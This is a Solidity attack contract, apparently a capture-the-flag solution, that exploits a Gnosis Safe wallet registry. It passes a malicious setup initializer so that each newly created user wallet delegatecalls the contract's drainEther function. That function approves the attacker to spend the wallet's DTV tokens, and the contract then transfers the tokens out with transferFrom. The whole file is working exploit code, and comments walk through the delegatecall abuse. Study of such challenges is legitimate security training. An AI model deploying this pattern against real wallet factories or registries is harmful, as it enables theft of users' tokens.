// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";

import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";

interface IGnosisSafeProxyFactory {
    function createProxyWithCallback(address _singleton, bytes memory initializer, uint256 saltNonce, IProxyCreationCallback callback) external returns (GnosisSafeProxy proxy);
}

contract BackdoorExploit {

    address public proxyFactor;
    address public walletRegistry;
    address public gnosisMaster;
    address payable public dtvToken;

    constructor(address _proxyFactor, address _walletRegistry, address _gnosisMaster, address payable _dtvToken) {
        proxyFactor = _proxyFactor;
        walletRegistry = _walletRegistry;
        gnosisMaster = _gnosisMaster;
        dtvToken = _dtvToken;
    }

    function drainEther(address spender, address token) external {
        IERC20(token).approve(spender, 10 ether);
    }

    function exploit(address _attacker, address[] memory _users, uint256 amounts) external {
        for(uint8 i=0 ; i<_users.length ; i++) {
            address[] memory users = new address[](1);
            users[0] = _users[i];

            // setupModules()'s delegatecall() allows an attacker to use user-defined function drainEther().
            bytes memory encodedPayload = abi.encodeWithSignature("drainEther(address,address)", address(this), dtvToken);

            bytes memory initializer = abi.encodeWithSignature("setup(address[],uint256,address,bytes,address,address,uint256,address)",
                                                                users, 
                                                                1, 
                                                                address(this), 
                                                                encodedPayload, 
                                                                address(0), 
                                                                address(0), 
                                                                0, 
                                                                address(0));

            // when attacker's proxy contract deployed and initialized, user's DTV token benefit transfer approved by 'setup() -> setupModules() -> delegatecall(drainEther())'
            GnosisSafeProxy proxy = IGnosisSafeProxyFactory(proxyFactor).createProxyWithCallback(gnosisMaster, initializer, 0, IProxyCreationCallback(walletRegistry));

            // after each user deploys and initalizes the wallet proxy contract, attacker receives ether using transferFrom() : user -> attacker
            IERC20(dtvToken).transferFrom(address(proxy), _attacker, amounts);            
        }
    }

    receive() external payable {}
}